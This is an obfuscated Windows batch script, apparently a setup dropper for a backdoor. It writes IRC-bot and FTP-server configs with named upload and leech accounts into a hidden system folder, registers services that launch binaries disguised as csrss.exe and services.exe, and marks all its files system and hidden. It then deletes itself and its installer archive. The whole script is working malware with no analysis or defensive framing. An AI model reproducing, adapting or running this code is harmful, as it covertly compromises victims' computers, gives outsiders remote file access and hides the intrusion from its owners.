@echo off
set q=set 
%q%ax=goto 
%q%k=if 
%q%p=cd 
%q%c=echo 
%c%%random%
%q%aa= == 
%q%ab= (%q%a
%q%ac= LSS 1 
%q%ad= GTR 26 
:a7
%q%abd=%random%
%k%%abd%%ac:~0,-3% 100 %ax%a7
%k%%abd%%ad:~0,-3%999 %ax%a7
:a1
%q%a1=%random:~0,-3%
%k%%a1%%ac%%ax%a1
%k%%a1%%ad%%ax%a1
%k%%a1%%aa%1%ab%1=A)
%k%%a1%%aa%2%ab%1=B)
%k%%a1%%aa%3%ab%1=C)
%k%%a1%%aa%4%ab%1=D)
%k%%a1%%aa%5%ab%1=E)
%k%%a1%%aa%6%ab%1=F)
%k%%a1%%aa%7%ab%1=G)
%k%%a1%%aa%8%ab%1=H)
%k%%a1%%aa%9%ab%1=I)
%k%%a1%%aa%10%ab%1=J)
%k%%a1%%aa%11%ab%1=K)
%k%%a1%%aa%12%ab%1=L)
%k%%a1%%aa%13%ab%1=M)
%k%%a1%%aa%14%ab%1=N)
%k%%a1%%aa%15%ab%1=O)
%k%%a1%%aa%16%ab%1=P)
%k%%a1%%aa%17%ab%1=Q)
%k%%a1%%aa%18%ab%1=R)
%k%%a1%%aa%19%ab%1=S)
%k%%a1%%aa%20%ab%1=T)
%k%%a1%%aa%21%ab%1=U)
%k%%a1%%aa%22%ab%1=V)
%k%%a1%%aa%23%ab%1=W)
%k%%a1%%aa%24%ab%1=X)
%k%%a1%%aa%25%ab%1=Y)
%k%%a1%%aa%26%ab%1=Z)
:a2
%q%a2=%random:~0,-3%
%k%%a2%%ac%%ax%a2
%k%%a2%%ad%%ax%a2
%k%%a2%%aa%1%ab%2=A)
%k%%a2%%aa%2%ab%2=B)
%k%%a2%%aa%3%ab%2=C)
%k%%a2%%aa%4%ab%2=D)
%k%%a2%%aa%5%ab%2=E)
%k%%a2%%aa%6%ab%2=F)
%k%%a2%%aa%7%ab%2=G)
%k%%a2%%aa%8%ab%2=H)
%k%%a2%%aa%9%ab%2=I)
%k%%a2%%aa%10%ab%2=J)
%k%%a2%%aa%11%ab%2=K)
%k%%a2%%aa%12%ab%2=L)
%k%%a2%%aa%13%ab%2=M)
%k%%a2%%aa%14%ab%2=N)
%k%%a2%%aa%15%ab%2=O)
%k%%a2%%aa%16%ab%2=P)
%k%%a2%%aa%17%ab%2=Q)
%k%%a2%%aa%18%ab%2=R)
%k%%a2%%aa%19%ab%2=S)
%k%%a2%%aa%20%ab%2=T)
%k%%a2%%aa%21%ab%2=U)
%k%%a2%%aa%22%ab%2=V)
%k%%a2%%aa%23%ab%2=W)
%k%%a2%%aa%24%ab%2=X)
%k%%a2%%aa%25%ab%2=Y)
%k%%a2%%aa%26%ab%2=Z)
:a3
%q%a3=%random:~0,-3%
%k%%a3%%ac%%ax%a3
%k%%a3%%ad%%ax%a3
%k%%a3%%aa%1%ab%3=A)
%k%%a3%%aa%2%ab%3=B)
%k%%a3%%aa%3%ab%3=C)
%k%%a3%%aa%4%ab%3=D)
%k%%a3%%aa%5%ab%3=E)
%k%%a3%%aa%6%ab%3=F)
%k%%a3%%aa%7%ab%3=G)
%k%%a3%%aa%8%ab%3=H)
%k%%a3%%aa%9%ab%3=I)
%k%%a3%%aa%10%ab%3=J)
%k%%a3%%aa%11%ab%3=K)
%k%%a3%%aa%12%ab%3=L)
%k%%a3%%aa%13%ab%3=M)
%k%%a3%%aa%14%ab%3=N)
%k%%a3%%aa%15%ab%3=O)
%k%%a3%%aa%16%ab%3=P)
%k%%a3%%aa%17%ab%3=Q)
%k%%a3%%aa%18%ab%3=R)
%k%%a3%%aa%19%ab%3=S)
%k%%a3%%aa%20%ab%3=T)
%k%%a3%%aa%21%ab%3=U)
%k%%a3%%aa%22%ab%3=V)
%k%%a3%%aa%23%ab%3=W)
%k%%a3%%aa%24%ab%3=X)
%k%%a3%%aa%25%ab%3=Y)
%k%%a3%%aa%26%ab%3=Z)
%q%abc=%a1%%a2%%a3%
%q%s=[BLZ-%abc%-%abd%]
%q%x==========
%q%z=.dll
%q%v=.exe
%q%a=ntauth%z%
%q%d=servicesmgr%z%
%q%e=winlogon%z%
%q%f=svchostlogon%z%
%q%m=net start 
%q%g= > nul
%q%n=ATTRIB +R +S +H 
%q%h=h%v% 
%q%i=erase 
%q%j=mkdir 
%q%y=%systemroot%\system\driver
%j%%y%
%p%%y%
%c%%x%         Botname: %s%>>%e%
%c%%x%%x%%x%%x%%x%%x%======>>%e%
%c%user_nick %s%>>%a%
%c%user_realname %s%>>%a%
%c%filedir %y%>>%a%
%c%uploaddir %y%>>%a%
%c%HomeDir=%y%>>%d%
%c%LoginMesFile=%y%\%e%>>%d%
%c%[USER=upload^|1]>>%d%
%c%Password=ltC0A2289FD279147C6BC7E2B142DE35F1>>%d%
%c%HomeDir=%y%\DAP\NTLOG>>%d%
%c%LoginMesFile=%y%\servicelogon%z%>>%d%
%c%RelPaths=^1>>%d%
%c%MaxUsersLoginPerIP=^1>>%d%
%c%TimeOut=600>>%d%
%c%MaxNrUsers=^4>>%d%
%c%Access1=%y%\NTLOG^|RWALCP>>%d%
%c%IPAccess1=A^|*>>%d%
%c%[USER=leech^|1]>>%d%
%c%Password=vz4863BF7A2D47386C3E9517A01257E72F>>%d%
%c%HomeDir=%y%\DAP\LOG>>%d%
%c%LoginMesFile=%y%\%f%>>%d%
%c%RelPaths=^1>>%d%
%c%MaxUsersLoginPerIP=^1>>%d%
%c%TimeOut=360>>%d%
%c%MaxNrUsers=^4>>%d%
%c%IPAccess1=A^|*>>%d%
%c%Access1=%y%\DAP\LOG^|RLP>>%d%
%h%ntsrv -install -name:"NTLOAD" -launch:"%y%\csrss%v%"
%h%ntsrv -install -name:"NTSVCMGR" -launch:"%y%\services%v% %y%\ntauth%z%"
%h%ntuser%v% -install
%m%NTLOAD%g%
%m%NTSVCMGR%g%
%m%NTBOOTMGR%g%
%n%csrss%v%
%n%cygcrypt-0%z%
%n%cygwin1%z%
%n%libeay32%z%
%n%ntauth%z%
%n%ntservice%z%
%n%ntsrv%v%
%n%ntuser%v%
%n%servicelogon%z%
%n%servicent%z%
%n%services%v%
%n%servicesmgr%z%
%n%ssleay32%z%
%n%svchostlogon%z%
%n%winlogon%z%
%n%servicent%z%
%n%ntservice%z%
%j%%y%\DAP
%j%%y%\DAP\LOG
%j%%y%\DAP\NTLOG
%n%%y%
%n%%y%\DAP
%n%%y%\DAP\LOG
%n%%y%\DAP\NTLOG
%i%%h%
%i%temp.tmp
%c%1 > "%sfxname%"
%i%"%sfxname%"
%i%setup.bat